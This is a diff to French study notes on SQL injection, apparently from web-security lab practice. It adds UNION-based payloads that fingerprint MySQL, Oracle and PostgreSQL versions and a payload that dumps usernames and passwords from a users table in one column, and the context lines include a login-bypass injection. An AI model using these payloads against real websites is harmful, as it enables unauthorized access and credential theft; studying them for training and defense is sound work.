@@ -27,22 +27,18 @@ password : test
 SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 ```
 
+## Examiner la base de données
+
+```
+MySQL, Microsoft : '+UNION+SELECT+@@version--
+Oracle : '+UNION+SELECT+banner+FROM+v$version--
+PostgreSQL : '+UNION+SELECT+version()--
+```
+
+Cheat Sheet dispo ici pour les BDD spécifiques : https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+
 ## Récupérer un ensemble de données d'autres tables
-
-Exemple : 
-
-```
-SELECT a, b FROM table1 UNION SELECT c, d FROM table2
-```
-
-Cette requête SQL renvoie un seul ensemble de résultats avec deux colonnes, contenant les valeurs des colonnes "a" et "b" dans "table1" ;  et des colonnes "c" et "d" dans "table2".
-
-### Les conditions pour que cela fonctionne
-
-- Chaque requête doit renvoyer le même nombre de colonnes.
-- Le type renvoyé doit-être une chaîne de caractères.
-
-  ### La chaîne d'exploitation
 
 1) Déterminer le nombre de colonnes renvoyés :
 
@@ -64,8 +60,6 @@ FOR ORACLE DATABASE :
 etc.
 ```
 
-Cheat Sheet dispo ici pour les BDD spécifiques : https://portswigger.net/web-security/sql-injection/cheat-sheet
-
 2) Déterminer les types de données
 
 Vérifier une par une les colonnes afin de vérifier s'il renvoient une chaîne de caractères :
@@ -83,3 +77,10 @@ Précédemment nous avons trouver 2 colonnes de type chaîne de caractères, alo
 ```
 '+UNION+SELECT+username,password+FROM+users--
 ```
+
+## Récupérer des données dans une seule colonne
+
+```
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+```
+
